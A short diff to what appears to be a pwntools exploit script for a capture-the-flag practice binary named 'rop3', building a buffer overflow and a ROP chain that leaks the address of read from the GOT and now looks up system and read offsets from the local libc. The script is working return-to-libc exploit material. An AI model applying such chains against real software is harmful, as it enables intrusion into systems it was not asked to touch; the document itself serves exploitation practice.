@@ -1,9 +1,10 @@
 from pwn import *
 ov=b"A"*140
 
+libc=ELF('/lib/i386-linux-gnu/libc.so.6')
 vulfun=0x08048474
-sys_off=0x3b340
-read_off=0xd9bf0
+sys_off=libc.sym['system']
+read_off=libc.sym['read']
 write_plt=0x080483A0
 read_got=0x804A000
 read_plt=0x08048360
@@ -12,7 +13,7 @@ globalbuf=0x0804A01F
 rop1=ov+p32(write_plt)+p32(vulfun)\
 +p32(1)+p32(read_got)+p32(4)
 
-p=process("./rop3")
+p=process("./pwn/stack/rop-3/rop3")
 # gdb.attach(p,'''
 # b *0x08048474
 # b *0x0804849B
